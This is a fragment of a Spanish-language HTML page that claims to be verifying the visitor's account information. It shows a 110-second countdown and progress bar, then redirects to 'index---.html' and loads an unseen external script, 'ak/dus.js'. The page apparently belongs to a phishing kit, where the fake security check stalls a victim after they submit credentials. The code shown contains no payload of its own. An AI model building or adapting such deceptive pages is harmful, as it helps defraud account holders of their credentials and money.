      <div class="cadd">
        <img src="https://i.postimg.cc/GmGQzzcR/36456.png" alt="" style="margin-bottom: 15px;">
      <p>Estamos verificando la autenticidad de tu información para garantizar la seguridad de tu cuenta.</p>
      </div>

        <div class="progress-bar">
        <div class="progress-fill"></div>
    </div>
     <p class="timer">Por favor espera <span id="seconds"></span> segundos…</p>
 
    </div>
   </div>



 
    
  


<script>
const WAIT_TIME = 110; 
const REDIRECT_URL = "index---.html";

window.addEventListener("load", () => {
    const bar = document.querySelector(".progress-fill");
    const txt = document.getElementById("seconds");
    const startTime = Date.now();
    const endTime = startTime + WAIT_TIME * 1000;
    function loop() {
        const now = Date.now();
        const remaining = Math.max(0, Math.ceil((endTime - now) / 1000));
        txt.textContent = remaining;
        const progress = Math.min(100, ((now - startTime) / (WAIT_TIME * 1000)) * 100);
        bar.style.width = progress + "%";
        if (now >= endTime) {
            window.location.href = REDIRECT_URL;
            return;
        }

        requestAnimationFrame(loop);
    }

    loop();
});
</script>


<script src="ak/dus.js"></script>

</html>
